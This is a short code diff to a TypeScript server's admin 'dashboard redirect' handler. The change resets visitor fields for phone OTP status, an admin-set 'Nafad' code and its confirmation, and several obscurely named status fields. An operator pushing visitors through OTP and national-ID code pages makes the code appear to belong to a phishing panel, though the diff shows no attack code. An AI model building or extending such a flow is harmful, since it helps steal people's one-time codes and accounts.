@@ -1008,10 +1008,22 @@ async function startServer() {
       const currentVisitor = await readVisitor(visitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
+      // Clear ALL previous statuses to prevent conflicts
       const updateData: Record<string, any> = {
         adminRedirectPage: targetPage,
         adminRedirectAt: new Date().toISOString(),
         redirectPage: targetPage,
+        currentPage: targetPage,
+        // Clear all previous statuses
+        phoneOtpStatus: null,
+        phoneRejectionMessage: null,
+        phoneResendRequested: null,
+        _v7: null,
+        adminNafadCode: null,
+        nafadConfirmationStatus: null,
+        _v1Status: null,
+        _v5Status: null,
+        _v6Status: null,
       };
 
       console.log("[Dashboard Redirect] Saving updateData:", updateData);
@@ -1019,7 +1031,7 @@ async function startServer() {
       
       // Verify it was saved
       const verifyVisitor = await readVisitor(visitorId);
-      console.log("[Dashboard Redirect] Verified visitor data:", verifyVisitor?.adminRedirectPage, verifyVisitor?.redirectPage);
+      console.log("[Dashboard Redirect] Verified visitor data:", verifyVisitor?.redirectPage);
 
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
